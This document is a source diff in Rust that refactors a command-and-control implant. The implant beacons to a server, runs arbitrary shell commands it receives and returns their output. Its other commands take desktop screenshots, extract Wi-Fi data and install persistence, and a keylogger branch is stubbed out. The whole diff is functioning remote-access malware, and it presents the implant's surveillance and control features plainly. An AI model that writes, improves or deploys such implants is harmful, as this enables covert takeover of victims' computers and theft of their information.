@@ -93,15 +93,17 @@ fn command_execution(cmd: &str) -> String {
     if cmd_trimmed == "ls" || cmd_trimmed == "dir" {
         let current_dir = get_current_dir();
         let cmd_to_run = if cfg!(target_os = "windows") {
-            "Get-ChildItem | Format-Table -AutoSize"
+            // Use simpler dir command for better formatting
+            "cmd /c dir"
         } else {
             "ls -la"
         };
         
         let output = if cfg!(target_os = "windows") {
-            Command::new("powershell")
+            // Use cmd directly for dir command to preserve formatting
+            Command::new("cmd")
                 .current_dir(&current_dir)
-                .args(["-Command", cmd_to_run])
+                .args(["/c", cmd_to_run])
                 .output()
         } else {
             Command::new("sh")
@@ -203,8 +205,7 @@ async fn send_command(token: &str, command: &serde_json::Value) -> Result<(), St
     }
 }
 
-async fn pong(msg: &str, cmd: &str, token: &str){
-
+async fn pong(msg: &str, cmd: &str, token: &str) {
     let response_cmd = serde_json::json!({
         "msg": "Command executed",
         "command": cmd,
@@ -215,9 +216,78 @@ async fn pong(msg: &str, cmd: &str, token: &str){
     }
 }
 
+async fn execute_desktop_command(token: &str) {
+    let pic_url = tokio::task::spawn_blocking(|| take_screenshot())
+        .await
+        .unwrap_or_else(|_| "Erro".to_string());
+    pong(&pic_url, "desktop", token).await;
+}
+
+async fn execute_wifi_command(token: &str) {
+    debug_log("[+] Executing wifi command...");
+    let wifi_info = extract_wifi();
+    debug_log(&wifi_info);
+    pong(&wifi_info, "wifi", token).await;
+}
+
+async fn execute_persistence_command(token: &str) {
+    debug_log("[+] Executing persistence command...");
+    match install() {
+        Ok(_) => {
+            debug_log("[+] Persistence installed successfully.");
+            pong("[+] Persistence installed", "persistence", token).await;
+        }
+        Err(e) => {
+            debug_log(&format!("[!] Failed to install persistence: {}", e));
+            pong(&format!("[!] Failed to install persistence: {}", e), "persistence", token).await;
+        }
+    }
+}
+
+async fn execute_shell_command(cmd: &str, token: &str) {
+    debug_log(&format!("[+] Executing shell command: {}", cmd));
+    let output = command_execution(cmd);
+    debug_log(&format!("[+] Command output: {}", output));
+
+    let mut output = clean_for_utf8(&output);
+    if output.len() > 4000 {
+        output = format!("{}\n[... output truncated ...]", &output[..4000]);
+    }
+    pong(&output, cmd, token).await;
+}
+
+async fn handle_command(cmd: &str, token: &str) {
+    debug_log(&format!("[+] Received command: {}", cmd));
+    
+    match cmd {
+        "desktop" => execute_desktop_command(token).await,
+        "wifi" => execute_wifi_command(token).await,
+        "keylogger" => debug_log("[!] not working...."),
+        "persistence" => execute_persistence_command(token).await,
+        _ => execute_shell_command(cmd, token).await,
+    }
+}
+
+fn update_sleep_time(response_json: &Value, current_sleep: &mut u64) {
+    if let Some(sleep) = response_json.get("sleep").and_then(|v| v.as_i64()) {
+        *current_sleep = sleep as u64;
+        debug_log(&format!("[+] Sleep time updated to: {} seconds", current_sleep));
+    }
+}
+
+async fn handle_successful_response(response_json: &Value, token: &str, sleep_time: &mut u64) {
+    if let Some(cmd) = response_json.get("cmd").and_then(|v| v.as_str()) {
+        handle_command(cmd, token).await;
+    }
+    
+    update_sleep_time(response_json, sleep_time);
+    tokio::time::sleep(tokio::time::Duration::from_secs(*sleep_time)).await;
+}
+
 async fn ping(token: &str) {
     let client = reqwest::Client::new();
     let mut sleep_time = TIME;
+    
     loop {
         let url = format!("{}/implants/ping/{}", URL, token);
         let res = client.get(&url).send().await;
@@ -227,70 +297,20 @@ async fn ping(token: &str) {
                 let status = response.status();
                 let body = response.text().await.unwrap_or_default();
 
-                if status == reqwest::StatusCode::OK {
-                    debug_log(&format!("GET Response:\n{}", body));
-                    let response_json: Value = serde_json::from_str(&body).unwrap_or(Value::Null);
-                    if let Some(cmd) = response_json.get("cmd").and_then(|v| v.as_str()) {
-                        debug_log(&format!("[+] Received command: {}", cmd));
-                        match cmd {
-                            "desktop" => {
-                                let pic_url = tokio::task::spawn_blocking(|| take_screenshot())
-                                    .await
-                                    .unwrap_or_else(|_| "Erro".to_string());
-                                pong(&pic_url, cmd, &token).await;
-                            }
-                            "wifi" => {
-                                debug_log("[+] Executing wifi command...");
-                                let wifi_info = extract_wifi();
-                                debug_log(&wifi_info);
-                                pong(&wifi_info, cmd, &token).await;
-                            }
-                            "stealer" => {
-                                debug_log("[!] not working....");
-                            }
-                            "persistence" => {
-
-                                debug_log("[+] Executing persistence command...");
-
-                                match install(){
-                                    Ok(_) => {
-                                        debug_log("[+] Persistence installed successfully.");
-                                        pong("[+] Persistence installed", cmd, &token).await;
-                                    }
-                                    Err(e) => {
-                                        debug_log(&format!("[!] Failed to install persistence: {}", e));
-                                        pong(&format!("[!] Failed to install persistence: {}", e), cmd, &token).await;
-                                    }
-                                }
-                            }
-                            _ => {
-                                debug_log(&format!("[+] Executing shell command: {}", cmd));
-                                let output = command_execution(cmd);
-                                debug_log(&format!("[+] Command output: {}", output));
-
-                                let mut output = clean_for_utf8(&output);
-                                if output.len() > 4000 {
-                                    output = format!("{}\n[... output truncated ...]", &output[..4000]);
-                                }
-                                pong(&output, cmd, &token).await;
-                            }
-                        }
+                match status {
+                    reqwest::StatusCode::OK => {
+                        debug_log(&format!("GET Response:\n{}", body));
+                        let response_json: Value = serde_json::from_str(&body).unwrap_or(Value::Null);
+                        handle_successful_response(&response_json, token, &mut sleep_time).await;
                     }
-
-                    // Verifica se há mudança no tempo de sleep
-                    if let Some(sleep) = response_json.get("sleep").and_then(|v| v.as_i64()) {
-                        sleep_time = sleep as u64;
-                        debug_log(&format!("[+] Sleep time updated to: {} seconds", sleep_time));
+                    reqwest::StatusCode::GONE => {
+                        debug_log("[!] Implant was removed from server. Exiting...");
+                        std::process::exit(0);
                     }
-
-                    tokio::time::sleep(tokio::time::Duration::from_secs(sleep_time)).await;
-                    // Continue o loop em vez de retornar
-                } else if status == reqwest::StatusCode::GONE {
-                    debug_log("[!] Implant was removed from server. Exiting...");
-                    std::process::exit(0);
-                } else {
-                    debug_log(&format!("Ping failed with status: {}", status));
-                    tokio::time::sleep(tokio::time::Duration::from_secs(sleep_time)).await;
+                    _ => {
+                        debug_log(&format!("Ping failed with status: {}", status));
+                        tokio::time::sleep(tokio::time::Duration::from_secs(sleep_time)).await;
+                    }
                 }
             }
             Err(_) => {
